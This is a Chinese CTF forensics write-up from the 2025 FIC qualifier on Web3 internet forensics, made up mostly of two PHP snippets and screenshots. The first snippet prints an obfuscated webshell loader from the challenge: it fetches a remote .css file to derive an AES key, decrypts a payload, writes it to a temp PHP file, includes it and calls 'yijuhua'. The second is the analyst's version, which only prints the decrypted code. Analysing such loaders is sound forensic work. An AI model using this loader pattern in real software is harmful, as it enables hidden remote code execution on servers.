# Web3互联网取证—2025FIC晋级赛

> 原文: https://www.ctfiot.com/243688.html
> ID: 243688

本栏目主要是针对比赛题目进行分析和解题思路分享，只进行知识分享，不具一定的实战能力，后台不解答涉及可能侵害他人权利的问题，切勿用于违法犯罪活动。如果有工作方面的解答需求，请后台联系添加微信私聊。

2025FIC晋级赛的WP在赛后这两天已经涌现出很多高质量的，在互联网取证部分很多参赛选手采用了先去Github搜索到信息的方法，我在此分享一下采用由弘连公司发行的《取证实录》中刊载的方法。以赛促练、以赛促学，借助2025FIC晋级赛的题目，学习简单的Web3域名相关的知识以及取证思维，同时随着行文给出参考文章方便各位读者延伸阅读。


```
$a=file_get_contents('https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css');$b=md5($a,true);$c=file_get_contents('../../../../encrypted.bin');$d=base64_decode($c);$e='aes-256-cbc';$f=openssl_cipher_iv_length($e);$g=substr($d,0,$f);$h=substr($d,$f);$i=openssl_decrypt($h,$e,$b,OPENSSL_RAW_DATA,$g);$j=sys_get_temp_dir();$k=$j.'/func_'.uniqid().'.php';file_put_contents($k,"<?phpn".$i);include $k;unlink($k);yijuhua();
```



```
<?php
$a=file_get_contents('./蜂蜜锅底.css');
$b=md5($a,true);
$c=file_get_contents('./encrypted.bin');
$d=base64_decode($c);
$e='aes-256-cbc';
$f=openssl_cipher_iv_length($e);
$g=substr($d,0,$f);
$h=substr($d,$f);
$i=openssl_decrypt($h,$e,$b,OPENSSL_RAW_DATA,$g);
echo$i;
//$j=sys_get_temp_dir();
//$k=$j.'/func_'.uniqid().'.php';
//file_put_contents($k,"<?phpn".$i);include $k;
//unlink($k);
//yijuhua();

?>
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-ce236f90080dff56d0db3158976ac873.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-6b22c3104f43c777d1aebd8b780e2e88.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-1033c9990b441451fceca1623cd05fa9.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-f43ce34b717a12ebf6bba3fa325ae03e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-a34a33890fb7c9341f251638594b1d09.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-7a752116fadca62af3df7ff1a7e50e30.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-389b1ca401dbf03fe8fceeb838d91e19.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-df9660787fca7bd2593d4475a1919def.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-c9a9a5b7dd56f141aaf91d141f9e2efd.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-e8d546ec91365c497563dfc946168864.png)